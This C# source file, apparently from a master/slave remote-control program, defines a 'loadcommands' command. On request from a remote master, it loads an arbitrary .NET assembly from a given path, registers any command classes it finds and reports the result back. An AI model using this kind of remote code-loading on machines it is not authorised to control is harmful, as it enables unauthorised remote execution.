﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using Shared;
using Slave.Core;

namespace Slave.Commands
{
    internal class LoadCommands : ICommand
    {
        public string name { get; } = "loadcommands";

        public void Process(List<string> args)
        {
            var path = args[1];
            Assembly loadedAssembly;

            try
            {
                loadedAssembly = Assembly.LoadFrom(path);
                SlaveNetworkManager.GetInstance().WriteLine("OK");
            }
            catch (Exception)
            {
                SlaveNetworkManager.GetInstance().WriteLine("KO");
                return;
            }

            // Instanciate command classes
            var loadedCommands = GlobalCommandsManager.LoadICommandsFromAssembly(new[] {loadedAssembly});

            // Send result to master
            SlaveNetworkManager.GetInstance().WriteLine(
                loadedCommands.Count != 0
                ? loadedCommands.Aggregate((x, y) => $"{x} {y}")
                : "KO"
            );
        }
    }
}
